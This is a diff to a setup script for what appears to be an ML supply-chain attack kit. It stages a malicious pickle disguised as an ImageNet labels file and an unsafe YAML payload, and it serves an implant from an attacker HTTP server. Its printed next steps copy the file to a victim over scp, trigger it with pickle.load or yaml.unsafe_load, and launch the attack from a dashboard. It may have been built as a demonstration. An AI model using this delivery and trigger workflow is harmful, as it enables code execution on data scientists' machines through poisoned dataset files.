@@ -85,16 +85,9 @@ ok "dataset_config.yaml  →  $OUT_DIR/dataset_config.yaml"
 ok "implant.py           →  $OUT_DIR/serve/implant.py"
 
 # ---------------------------------------------------------------------------
-# 3. Write victim/loader.py to OUT_DIR for easy scp
+# 3. Summary
 # ---------------------------------------------------------------------------
-echo -e "\n${YLW}[3/4] Staging victim loader...${NC}"
-cp victim/loader.py "$OUT_DIR/loader.py"
-ok "loader.py            →  $OUT_DIR/loader.py"
-
-# ---------------------------------------------------------------------------
-# 4. Summary
-# ---------------------------------------------------------------------------
-echo -e "\n${YLW}[4/4] Setup complete. Files generated:${NC}\n"
+echo -e "\n${YLW}[3/3] Setup complete. Files generated:${NC}\n"
 ls -lh "$OUT_DIR/"
 echo ""
 ls -lh "$OUT_DIR/serve/"
@@ -105,9 +98,12 @@ ${GRN}════════════════════════�
 ${GRN}  NEXT STEPS${NC}
 ${GRN}══════════════════════════════════════════${NC}
 
-${YLW}1. Copy files to victim (you handle this):${NC}
+${YLW}1. Copy the pickle to the victim (you handle this):${NC}
    scp $OUT_DIR/imagenet_labels.pkl  ubuntu@<VICTIM_IP>:/tmp/
-   scp $OUT_DIR/loader.py            ubuntu@<VICTIM_IP>:/tmp/
+
+   [ The pickle is the only thing that goes to the victim.
+     It looks like a normal ImageNet labels dataset file.
+     The victim loads it with their own code — standard ML workflow. ]
 
 ${YLW}2. Start implant HTTP server on attacker (terminal 1):${NC}
    cd $OUT_DIR/serve && python3 -m http.server $ATTACKER_PORT
@@ -116,13 +112,13 @@ ${YLW}3. Start dashboard (terminal 2, from repo root):${NC}
    python3 dashboard/app.py
    → http://$ATTACKER_IP:5001
 
-${YLW}4. On victim — simulate the data scientist loading the dataset:${NC}
-   python3 /tmp/loader.py --dataset /tmp/imagenet_labels.pkl
+${YLW}4. On victim — trigger: simulate the data scientist loading the dataset:${NC}
+   python3 -c "import pickle; pickle.load(open('/tmp/imagenet_labels.pkl','rb'))"
 
 ${YLW}5. Click "Launch Attack" in the dashboard.${NC}
 
-${YLW}YAML vector (alternative to pickle):${NC}
+${YLW}YAML vector (alternative):${NC}
    scp $OUT_DIR/dataset_config.yaml  ubuntu@<VICTIM_IP>:/tmp/
-   python3 /tmp/loader.py --vector yaml --dataset /tmp/dataset_config.yaml
+   python3 -c "import yaml; yaml.unsafe_load(open('/tmp/dataset_config.yaml'))"
 
 SUMMARY
